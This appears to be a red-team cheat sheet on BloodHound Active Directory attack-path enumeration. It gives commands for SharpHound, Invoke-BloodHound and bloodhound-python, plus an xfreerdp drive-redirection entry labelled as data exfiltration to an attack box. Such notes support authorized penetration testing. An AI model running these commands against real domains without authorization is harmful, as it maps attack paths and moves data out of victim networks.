# BloodHound – AD Attack Path Enumeration

> **Pre-req:** `source /opt/venvTools/bin/activate`

### SharpHound C# Ingestor (On-Target) [added: 2026-04]
- **Tags:** #SharpHound #BloodHound #ADGraph #Ingestor #CSharp #AttackPath #T1087.002
- **Trigger:** Domain-joined Windows host available; need to collect full AD graph for BloodHound analysis
- **Prereq:** Domain-joined Windows host, SharpHound.exe available, valid domain session
- **Yields:** ZIP file containing all AD objects, sessions, ACLs, trusts for BloodHound GUI import
- **Opsec:** High
- **Context:** Run SharpHound directly on a domain-joined Windows host to collect all AD objects, sessions, ACLs, and trusts.
- **Payload/Method:**
  ```powershell
  .\SharpHound.exe -c all --zipfilename <output_name>
  ```

### SharpHound PowerShell Ingestor (On-Target) [added: 2026-04]
- **Tags:** #SharpHound #BloodHound #PowerShell #Ingestor #InvokeBloodHound #AttackPath #T1087.002
- **Trigger:** Can load PowerShell scripts but not run executables on target; need BloodHound collection
- **Prereq:** Domain-joined Windows host, SharpHound.ps1 loadable, valid domain session
- **Yields:** ZIP file with full AD graph data for BloodHound import
- **Opsec:** High
- **Context:** PowerShell alternative to the C# ingestor. Useful when you can load scripts but not run executables.
- **Payload/Method:**
  ```powershell
  Import-Module .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod all -ZipFileName <output_name>
  ```

### bloodhound-python (Remote from Linux) [added: 2026-04]
- **Tags:** #bloodhound-python #BloodHound #LinuxCollection #RemoteEnum #ADGraph #LDAP #T1087.002
- **Trigger:** Valid domain credentials on Linux attack box; no Windows foothold needed for BloodHound collection
- **Prereq:** Valid domain credentials, bloodhound-python installed, network access to DC (LDAP/SMB)
- **Yields:** Full AD graph data collected remotely for BloodHound GUI import
- **Opsec:** Med
- **Context:** Collect BloodHound data remotely from a Linux attack box with valid domain credentials. No need for a foothold on a Windows host.
- **Payload/Method:**
  ```bash
  bloodhound-python -dc <DC_HOSTNAME> -gc <GC_HOSTNAME> -d <DOMAIN> -c All -u <username> -p <password>
  ```

### RDP Drive Redirection for Data Exfil [added: 2026-04]
- **Tags:** #RDP #DriveRedirection #xfreerdp #DataExfil #FileTransfer #LateralMovement #T1021.001
- **Trigger:** Need to transfer files (SharpHound output, tools) between Linux attack box and Windows target via RDP
- **Prereq:** RDP access to target, xfreerdp installed on Linux attack box
- **Yields:** Bidirectional file transfer between attack box and target via shared RDP drive
- **Opsec:** Low
- **Context:** Transfer SharpHound output (or any file) between attack box and target via RDP shared drive.
- **Payload/Method:**
  ```bash
  xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS> /drive:data,/tmp
  # Files appear at \\tsclient\data on the target
  ```
